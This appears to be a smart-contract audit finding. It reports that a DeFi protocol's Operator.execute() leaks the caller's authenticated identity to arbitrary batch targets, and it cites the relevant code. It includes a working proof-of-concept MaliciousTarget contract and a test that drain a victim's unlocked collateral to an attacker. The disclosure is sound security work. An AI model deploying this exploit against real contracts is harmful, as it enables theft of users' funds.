### Title
Operator leaks the caller’s authenticated context to every arbitrary call target, allowing a malicious target to withdraw the caller’s collateral - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute()` stores the external caller in transient storage and then invokes every user-supplied `target` with arbitrary calldata. [1](#0-0) [2](#0-1)  While any target is executing, `SynthContext._msgSender()` continues to resolve `msg.sender == operator` to the stored external caller. [3](#0-2)  A malicious call target can therefore invoke `DepositToken.withdraw(amount, attacker)` during the batch and spend the victim’s unlocked deposit-token balance as if the victim had called it directly. [4](#0-3) 

### Finding Description
The intended authenticated boundary is the individual protocol call, but `Operator` actually grants the caller’s identity to every contract invoked by the batch. [5](#0-4)  `setMsgSender()` clears the transient identity only after all calls complete, so an untrusted intermediate target receives the same delegated authority as the intended Pool or gateway target. [1](#0-0) 

`DepositToken.withdraw()` uses `_msgSender()` as the account whose shares are burned, checks only that the amount is unlocked, and accepts an unrestricted `to_` recipient. [4](#0-3)  Consequently, a malicious contract included in the call array can call `depositToken.withdraw(depositToken.unlockedBalanceOf(victim), attacker)` and redirect the withdrawn underlying collateral to itself. [6](#0-5) [4](#0-3) 

### Impact Explanation
This breaks sender-identity isolation and permits direct theft of all unlocked collateral exposed through `Operator`. [4](#0-3)  The same primitive can also transfer deposit shares to an attacker because `transfer()` resolves and spends `_msgSender()`’s unlocked balance. [7](#0-6) 

### Likelihood Explanation
`Operator.execute()` explicitly accepts arbitrary targets and calldata, and neither the target nor the calldata is restricted to protocol contracts. [2](#0-1)  The attacker only needs the victim to submit a batch containing an attacker-controlled target, analogous to following a cross-origin redirect while preserving credentials. [1](#0-0)  `nonReentrant` does not prevent the malicious target from calling a different protocol contract because it only protects nested calls back into `Operator.execute()`. [8](#0-7) 

### Recommendation
Do not expose the delegated identity to arbitrary targets; restrict executable targets to an authenticated protocol allowlist or use a per-call authorization envelope that is consumed only by the intended contract. [5](#0-4)  Alternatively, clear `MSG_SENDER_STORAGE` before each untrusted call and pass the intended sender through signed, target-bound calldata rather than ambient transient authority. [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IDepositToken {
    function unlockedBalanceOf(address account_) external view returns (uint256);
    function withdraw(uint256 amount_, address to_) external returns (uint256, uint256);
}

contract MaliciousTarget {
    function steal(address depositToken_, address victim_, address receiver_) external {
        uint256 amount = IDepositToken(depositToken_).unlockedBalanceOf(victim_);
        IDepositToken(depositToken_).withdraw(amount, receiver_);
    }
}
```

```ts
it('malicious target drains collateral during Operator.execute', async () => {
  const amount = parseUnits('100', 6)

  await usdc.connect(alice).approve(msdUSDC.address, amount)
  await msdUSDC.connect(alice).deposit(amount, alice.address)

  const malicious = await (
    await ethers.getContractFactory('MaliciousTarget', attacker)
  ).deploy()

  const usdcBefore = await usdc.balanceOf(attacker.address)

  await operator.connect(alice).execute([
    {
      target: malicious.address,
      value: 0,
      callData: malicious.interface.encodeFunctionData('steal', [
        msdUSDC.address,
        alice.address,
        attacker.address,
      ]),
    },
  ])

  expect(await msdUSDC.balanceOf(alice.address)).to.eq(0)
  expect(await usdc.balanceOf(attacker.address)).to.eq(usdcBefore.add(amount))
})
```

### Citations

**File:** contracts/Operator.sol (L20-23)
```text
    modifier setMsgSender() {
        MSG_SENDER_STORAGE.asAddress().tstore(msg.sender);
        _;
        MSG_SENDER_STORAGE.asAddress().tstore(address(0));
```

**File:** contracts/Operator.sol (L34-48)
```text
    function execute(
        Call[] calldata calls_
    ) external payable override nonReentrant setMsgSender returns (bytes[] memory _returnData) {
        uint256 _length = calls_.length;
        _returnData = new bytes[](_length);

        uint256 _sumOfValues;
        Call calldata _call;
        for (uint256 i; i < _length; ) {
            _call = calls_[i];
            uint256 _value = _call.value;
            unchecked {
                _sumOfValues += _value;
            }
            _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
```

**File:** contracts/utils/SynthContext.sol (L14-23)
```text
    function _msgSender() internal view virtual override returns (address) {
        IPoolRegistry _poolRegistry = poolRegistry();
        if (address(_poolRegistry) != address(0)) {
            IOperator _operator = _poolRegistry.operator();
            if (msg.sender == address(_operator)) {
                return _operator.getActualMsgSender();
            }
        }

        return msg.sender;
```

**File:** contracts/DepositToken.sol (L348-354)
```text
    function transfer(address to_, uint256 amount_) external override returns (bool) {
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        _transfer(_msgSender, to_, amount_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L383-397)
```text
    function unlockedBalanceOf(address account_) public view override returns (uint256 _unlockedBalance) {
        IPool _pool = pool;

        (, , uint256 _debtInUsd, , uint256 _issuableInUsd) = _pool.debtPositionOf(account_);

        if (_debtInUsd == 0) {
            return balanceOf[account_];
        }

        if (_issuableInUsd > 0) {
            _unlockedBalance = Math.min(
                balanceOf[account_],
                _pool.masterOracle().quoteUsdToToken(address(underlying), _issuableInUsd.wadDiv(collateralFactor))
            );
        }
```

**File:** contracts/DepositToken.sol (L406-412)
```text
    function withdraw(uint256 amount_, address to_) external override returns (uint256 _withdrawn, uint256 _fee) {
        if (to_ == address(0)) revert RecipientIsNull();
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        return _withdraw({account_: _msgSender, amount_: amount_, to_: to_});
    }
```
